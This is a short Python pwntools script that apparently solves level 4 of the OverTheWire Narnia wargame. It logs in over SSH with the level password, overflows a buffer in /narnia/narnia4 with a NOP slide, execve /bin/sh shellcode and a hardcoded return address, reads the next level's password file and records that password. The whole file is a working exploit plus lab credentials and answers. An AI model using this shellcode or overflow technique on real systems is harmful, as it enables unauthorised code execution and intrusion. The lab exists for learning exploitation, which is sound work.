import pwn
#doesn't format correctly but the main idea is
#buffer|shellcode|address so that esp jumps to shellcode
s=pwn.ssh(user='narnia4', host='narnia.labs.overthewire.org', password='thaenohtai', port=2226)
nopslide="'\x90'*239"
shellcode="'\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80'"
#where the shellcode is:
address="'\x80\xd8\xff\xff'"
sh=s.run('sh')
sh.sendline("/narnia/narnia4 $(python -c 'print "+nopslide+shellcode+address+"')")
flag=''
try:
    for i in range(2):
        flag+=sh.recvline().decode('utf-8')
        print(flag)
except:
    print("Error")
sh.sendline('cat /etc/narnia_pass/narnia5')
flag=''
try:
    for i in range(2):
        flag+=sh.recvline().decode('utf-8')
        print(flag)
except:
    print("Error")
sh.close()
password='faimahchiy'
